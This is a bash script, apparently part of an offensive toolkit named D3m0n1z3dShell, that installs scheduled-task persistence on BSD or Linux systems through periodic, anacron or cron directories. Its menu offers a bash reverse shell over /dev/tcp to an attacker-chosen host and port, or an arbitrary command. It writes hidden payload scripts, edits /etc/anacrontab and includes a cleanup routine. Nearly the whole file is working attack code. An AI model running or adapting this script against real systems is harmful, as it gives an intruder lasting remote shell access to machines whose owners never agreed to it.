#!/bin/bash
# D3m0n1z3dShell — Periodic/Anacron Script Persistence (T1053)
# Based on Metasploit periodic_script.rb — BSD periodic + Linux anacron fallback

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_periodic"

banner(){
    echo -e "${RED}"
    echo " ╔═══════════════════════════════════════════════════╗"
    echo " ║   Periodic/Anacron Script Persistence             ║"
    echo " ║   T1053 — BSD periodic or Linux anacron           ║"
    echo " ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root(){
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required${NC}"; exit 1; }
}

detect_system(){
    if [[ -d /etc/periodic ]] || [[ -d /usr/local/etc/periodic ]]; then
        echo "bsd"
    elif command -v anacron >/dev/null 2>&1 || [[ -f /etc/anacrontab ]]; then
        echo "anacron"
    elif [[ -d /etc/cron.daily ]]; then
        echo "cron_dirs"
    else
        echo "none"
    fi
}

install_bsd_periodic(){
    local INTERVAL="$1" PAYLOAD="$2"
    local PERIODIC_DIR="/etc/periodic/${INTERVAL}"
    local SCRIPT="${PERIODIC_DIR}/999.d3m0n-persist"

    mkdir -p "$PERIODIC_DIR"

    cat > "$SCRIPT" << EOF
#!/bin/sh
# ${MARKER}
${PAYLOAD}
exit 0
EOF

    chmod 755 "$SCRIPT"
    echo -e "${GREEN}[+] BSD periodic script installed: ${SCRIPT}${NC}"
    echo -e "${YELLOW}[*] Runs ${INTERVAL} via periodic(8)${NC}"
}

install_anacron(){
    local INTERVAL="$1" PAYLOAD="$2"
    local ANACRONTAB="/etc/anacrontab"
    local SCRIPT="/usr/local/bin/.d3m0n-periodic"

    # Write payload script
    cat > "$SCRIPT" << EOF
#!/bin/sh
# ${MARKER}
${PAYLOAD}
EOF
    chmod 755 "$SCRIPT"

    # Map interval to days
    local DAYS
    case "$INTERVAL" in
        daily)   DAYS=1 ;;
        weekly)  DAYS=7 ;;
        monthly) DAYS=30 ;;
        *)       DAYS=1 ;;
    esac

    if [[ -f "$ANACRONTAB" ]]; then
        if grep -q "$MARKER" "$ANACRONTAB" 2>/dev/null; then
            echo -e "${YELLOW}[*] Already installed in anacrontab${NC}"
            return
        fi
        cp "$ANACRONTAB" "${ANACRONTAB}.d3m0n.bak"
        echo "# ${MARKER}" >> "$ANACRONTAB"
        echo "${DAYS}	15	d3m0n-persist	${SCRIPT}" >> "$ANACRONTAB"
        echo -e "${GREEN}[+] Anacron entry added (every ${DAYS} day(s))${NC}"
    else
        echo -e "${RED}[-] /etc/anacrontab not found${NC}"
        return 1
    fi
}

install_cron_dir(){
    local INTERVAL="$1" PAYLOAD="$2"
    local CRON_DIR="/etc/cron.${INTERVAL}"
    local SCRIPT="${CRON_DIR}/d3m0n-persist"

    if [[ ! -d "$CRON_DIR" ]]; then
        echo -e "${RED}[-] ${CRON_DIR} not found${NC}"
        return 1
    fi

    cat > "$SCRIPT" << EOF
#!/bin/sh
# ${MARKER}
${PAYLOAD}
EOF
    chmod 755 "$SCRIPT"

    echo -e "${GREEN}[+] Installed: ${SCRIPT}${NC}"
    echo -e "${YELLOW}[*] Runs ${INTERVAL} via cron/anacron${NC}"
}

menu(){
    banner
    check_root

    local SYS=$(detect_system)
    echo -e "${CYAN}[*] Detected system: ${SYS}${NC}"

    if [[ "$SYS" == "none" ]]; then
        echo -e "${RED}[-] No periodic/anacron/cron.daily system found${NC}"
        return 1
    fi

    echo ""
    echo -e "  ${CYAN}[1]${NC} Install (reverse shell)"
    echo -e "  ${CYAN}[2]${NC} Install (custom command)"
    echo -e "  ${CYAN}[3]${NC} List installed"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "  Choice [1-4]: " OPT

    case "$OPT" in
        1)
            read -p "  LHOST: " LHOST
            read -p "  LPORT: " LPORT
            PAYLOAD="nohup /bin/sh -c '/bin/bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &"
            read -p "  Interval [daily/weekly/monthly]: " INT
            INT="${INT:-daily}"

            case "$SYS" in
                bsd)       install_bsd_periodic "$INT" "$PAYLOAD" ;;
                anacron)   install_anacron "$INT" "$PAYLOAD" ;;
                cron_dirs) install_cron_dir "$INT" "$PAYLOAD" ;;
            esac
            ;;
        2)
            read -p "  Command: " CMD
            read -p "  Interval [daily/weekly/monthly]: " INT
            INT="${INT:-daily}"

            case "$SYS" in
                bsd)       install_bsd_periodic "$INT" "$CMD" ;;
                anacron)   install_anacron "$INT" "$CMD" ;;
                cron_dirs) install_cron_dir "$INT" "$CMD" ;;
            esac
            ;;
        3)
            echo -e "${CYAN}[*] Installed d3m0n periodic scripts:${NC}"
            for d in /etc/periodic/daily /etc/periodic/weekly /etc/periodic/monthly /usr/local/etc/periodic/daily /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
                [[ -d "$d" ]] || continue
                for f in "$d"/*d3m0n*; do
                    [[ -f "$f" ]] && echo -e "  ${GREEN}→${NC} $f"
                done
            done
            [[ -f /usr/local/bin/.d3m0n-periodic ]] && echo -e "  ${GREEN}→${NC} /usr/local/bin/.d3m0n-periodic"
            grep -q "$MARKER" /etc/anacrontab 2>/dev/null && echo -e "  ${GREEN}→${NC} /etc/anacrontab entry"
            ;;
        4)
            echo -e "${YELLOW}[*] Cleaning up...${NC}"
            find /etc/periodic /usr/local/etc/periodic /etc/cron.daily /etc/cron.weekly /etc/cron.monthly -name '*d3m0n*' -delete 2>/dev/null
            rm -f /usr/local/bin/.d3m0n-periodic
            if [[ -f /etc/anacrontab.d3m0n.bak ]]; then
                mv /etc/anacrontab.d3m0n.bak /etc/anacrontab
                echo -e "  ${GREEN}[+] Restored anacrontab backup${NC}"
            elif [[ -f /etc/anacrontab ]]; then
                sed -i "/${MARKER}/d; /d3m0n-persist/d" /etc/anacrontab
            fi
            echo -e "${GREEN}[+] Cleaned${NC}"
            ;;
    esac
}

menu
